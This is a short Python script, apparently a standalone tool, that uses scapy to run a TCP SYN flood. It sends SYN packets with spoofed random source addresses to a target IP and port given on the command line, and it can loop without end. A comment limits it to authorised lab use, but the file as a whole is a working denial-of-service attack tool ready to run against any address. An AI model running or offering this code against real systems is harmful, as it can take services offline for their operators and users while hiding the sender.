from scapy.all import IP, TCP, send, RandIP, RandShort
import argparse

# For authorized/lab use only. Running this against systems you do not own
# or have explicit written permission to test is illegal.

parser = argparse.ArgumentParser(description="SYN Flood Simulator (lab use only)")
parser.add_argument("--target", required=True, help="Target IP address")
parser.add_argument("--port", type=int, required=True, help="Target port")
parser.add_argument("--count", type=int, default=100, help="Number of SYN packets to send (0 = infinite)")
args = parser.parse_args()

def syn_flood(target, port, count):
    packet = IP(dst=target, src=RandIP()) / TCP(dport=port, sport=RandShort(), flags="S")

    if count == 0:
        send(packet, loop=1, verbose=False)
    else:
        send(packet, count=count, verbose=False)
        print(f"Sent {count} SYN packets to {target}:{port}")

syn_flood(args.target, args.port, args.count)
